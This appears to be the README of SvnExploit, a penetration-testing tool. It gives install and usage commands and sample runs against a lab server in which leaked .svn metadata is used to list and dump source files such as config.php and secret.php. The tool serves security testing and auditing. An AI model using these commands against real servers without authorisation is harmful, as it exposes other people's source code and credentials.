![](https://blog-1252108140.cosbj.myqcloud.com/201910/1571274472.8948846.png)

如果您喜欢的话，希望您可以关注一下我们的微信公众号。

# SvnExploit

SvnExploit是一款SVN源代码利用工具，其完美支持SVN<1.7版本和SVN>1.7版本的SVN源代码泄露，更多请阅读：

[SVN源代码泄露利用工具](http://www.admintony.com/SVN源代码泄露利用工具.html)

[《SVN源代码泄露利用工具-SvnExploit》升级版](http://www.admintony.com/svnExploit-update.html)

# Useage

安装依赖库

```
sudo pip install -r requirements.txt
```

查看帮助

```
python SvnExploit.py -h
```

检测SVN源代码泄露

```
python SvnExploit.py -u http://192.168.27.128/.svn
```

下载源代码

```
python SvnExploit.py -u http://192.168.27.128/.svn --dump
```

# Example

## svn > 1.7版本

![](https://blog-1252108140.cosbj.myqcloud.com/201811/1543591373.3777962.png)

```
python .\svnExploit.py -u http://192.168.27.128/unit-2/lab3/.svn/
 ____             _____            _       _ _
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|
SvnExploit - Dump the source code by svn
Author: AdminTony (http://admintony.com)
https://github.com/admintony/svnExploit


+--------------------+----------+------------------------------------------------+
|       文件名       | 文件类型 |                    CheckSum                    |
+--------------------+----------+------------------------------------------------+
|      conn.php      |   file   | $sha1$8f47ccbd4a436aa4f31018fea026275f6059ed10 |
|       trunk        |   dir    |                      None                      |
|      branches      |   dir    |                      None                      |
|  admin_login.php   |   file   | $sha1$a6981b1ca963c8a75e133e38780be7ff0cd60952 |
|     phpmyadmin     |   file   | $sha1$6d5af41c175e344ee483732648edc9318b2a6014 |
|     README.TXT     |   file   | $sha1$c5981462cc06422f4a78e68f0a48dddcf5860eb9 |
|     README.txt     |   file   | $sha1$ef4b5f3081dbac31f9fb089aafd60dd2b9474b51 |
|     secret.php     |   file   | $sha1$2e6a7a6976d31847f0eebf7bbc252bcc1ff4f609 |
|     README.md      |   file   | $sha1$466f5ab1e4adfd373a23f639e0dd8fcfdce7874b |
| img/login_bg01.jpg |   file   | $sha1$311efc58c4d7035a54fdb8e94d6ba901c56354fd |
|        img         |   dir    |                      None                      |
|     index.php      |   file   | $sha1$4660847a73ab0906d91841dde9576bd5054b2020 |
|      test.sql      |   file   | $sha1$096a90da3e471a472874413b18cb2f5dd0567fd1 |
|     admin.php      |   file   | $sha1$f444d3aad996577872ac7b95a2c05aa11e6b1f8f |
|      document      |   dir    |                      None                      |
|        tags        |   dir    |                      None                      |
+--------------------+----------+------------------------------------------------+
```

```
python .\svnExploit.py -u http://192.168.27.128/unit-2/lab3/.svn/ --dump
 ____             _____            _       _ _
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|
SvnExploit - Dump the source code by svn
Author: AdminTony (http://admintony.com)
https://github.com/admintony/svnExploit


+--------------------+--------------------------------------------------------------------+----------+
|       文件名       |                                URL                                 | 下载状态 |
+--------------------+--------------------------------------------------------------------+----------+
|      conn.php      | .svn/pristine/8f/8f47ccbd4a436aa4f31018fea026275f6059ed10.svn-base | 下载成功 |
|     README.TXT     | .svn/pristine/c5/c5981462cc06422f4a78e68f0a48dddcf5860eb9.svn-base | 下载成功 |
|     README.txt     | .svn/pristine/ef/ef4b5f3081dbac31f9fb089aafd60dd2b9474b51.svn-base | 下载成功 |
|     phpmyadmin     | .svn/pristine/6d/6d5af41c175e344ee483732648edc9318b2a6014.svn-base | 下载成功 |
|     secret.php     | .svn/pristine/2e/2e6a7a6976d31847f0eebf7bbc252bcc1ff4f609.svn-base | 下载成功 |
|     README.md      | .svn/pristine/46/466f5ab1e4adfd373a23f639e0dd8fcfdce7874b.svn-base | 下载成功 |
|  admin_login.php   | .svn/pristine/a6/a6981b1ca963c8a75e133e38780be7ff0cd60952.svn-base | 下载成功 |
|     index.php      | .svn/pristine/46/4660847a73ab0906d91841dde9576bd5054b2020.svn-base | 下载成功 |
|     admin.php      | .svn/pristine/f4/f444d3aad996577872ac7b95a2c05aa11e6b1f8f.svn-base | 下载成功 |
|      test.sql      | .svn/pristine/09/096a90da3e471a472874413b18cb2f5dd0567fd1.svn-base | 下载成功 |
| img/login_bg01.jpg | .svn/pristine/31/311efc58c4d7035a54fdb8e94d6ba901c56354fd.svn-base | 下载成功 |
+--------------------+--------------------------------------------------------------------+----------+
[+] 已经Dump完成!
```

## svn < 1.7版本

![](https://blog-1252108140.cosbj.myqcloud.com/201811/1543591513.781983.png)

```
python .\svnExploit.py -u http://192.168.27.128/unit-2/lab2/.svn/
 ____             _____            _       _ _
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|
SvnExploit - Dump the source code by svn
Author: AdminTony (http://admintony.com)
https://github.com/admintony/svnExploit


+---------------------+----------+---------------------------------------------+
|        文件名       | 文件类型 |                     URL                     |
+---------------------+----------+---------------------------------------------+
|     favicon.ico     |   file   |     /.svn/text-base/favicon.ico.svn-base    |
|      index.html     |   file   |     /.svn/text-base/index.html.svn-base     |
|     phpinfo.php     |   file   |     /.svn/text-base/phpinfo.php.svn-base    |
|      shell.php      |   file   |      /.svn/text-base/shell.php.svn-base     |
|  config/config.php  |   file   |  config/.svn/text-base/config.php.svn-base  |
|     css/add.css     |   file   |     css/.svn/text-base/add.css.svn-base     |
|   css/colorbox.css  |   file   |   css/.svn/text-base/colorbox.css.svn-base  |
|   css/company.css   |   file   |   css/.svn/text-base/company.css.svn-base   |
| images/btn_back.png |   file   | images/.svn/text-base/btn_back.png.svn-base |
|   images/gitf.png   |   file   |   images/.svn/text-base/gitf.png.svn-base   |
|     js/common.js    |   file   |     js/.svn/text-base/common.js.svn-base    |
|   js/jquery.min.js  |   file   |   js/.svn/text-base/jquery.min.js.svn-base  |
|      js/loop.js     |   file   |      js/.svn/text-base/loop.js.svn-base     |
+---------------------+----------+---------------------------------------------+
```

```
python .\svnExploit.py -u http://192.168.27.128/unit-2/lab2/.svn/ --dump
 ____             _____            _       _ _
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|
SvnExploit - Dump the source code by svn
Author: AdminTony (http://admintony.com)
https://github.com/admintony/svnExploit


+---------------------+---------------------------------------------+----------+
|        文件名       |                     URL                     | 下载状态 |
+---------------------+---------------------------------------------+----------+
|     favicon.ico     |     /.svn/text-base/favicon.ico.svn-base    | 下载成功 |
|      index.html     |     /.svn/text-base/index.html.svn-base     | 下载成功 |
|     phpinfo.php     |     /.svn/text-base/phpinfo.php.svn-base    | 下载成功 |
|      shell.php      |      /.svn/text-base/shell.php.svn-base     | 下载成功 |
|  config/config.php  |  config/.svn/text-base/config.php.svn-base  | 下载成功 |
|     css/add.css     |     css/.svn/text-base/add.css.svn-base     | 下载成功 |
|   css/colorbox.css  |   css/.svn/text-base/colorbox.css.svn-base  | 下载成功 |
|   css/company.css   |   css/.svn/text-base/company.css.svn-base   | 下载成功 |
| images/btn_back.png | images/.svn/text-base/btn_back.png.svn-base | 下载成功 |
|   images/gitf.png   |   images/.svn/text-base/gitf.png.svn-base   | 下载成功 |
|     js/common.js    |     js/.svn/text-base/common.js.svn-base    | 下载成功 |
|   js/jquery.min.js  |   js/.svn/text-base/jquery.min.js.svn-base  | 下载成功 |
|      js/loop.js     |      js/.svn/text-base/loop.js.svn-base     | 下载成功 |
+---------------------+---------------------------------------------+----------+
```

# 更新记录

## 更新记录 - 20181130

```
1.添加svn版本识别函数 - SvnVersion
2.添加svn<1.7版本时源码泄露利用功能（自动识别svn版本），包括查看和Dump源码
3.优化显示，使用prettytable库输出表格
4.添加Banner，美化界面
```

## 更新记录 - 20180821

```
1.添加编码声明
2.将mkdir函数改成了makedirs，防止目录结构复杂的无法dump源码
```

# 结构

```
├── history
│   ├── README.md
│   └── svnExploit.py
├── readme.md
├── requirements.txt
└── SvnExploit.py
```

# 历史版本

svn>1.7时，dump源码工具

具体用法参考：
http://admintony.com/SVN源代码泄露利用工具.html
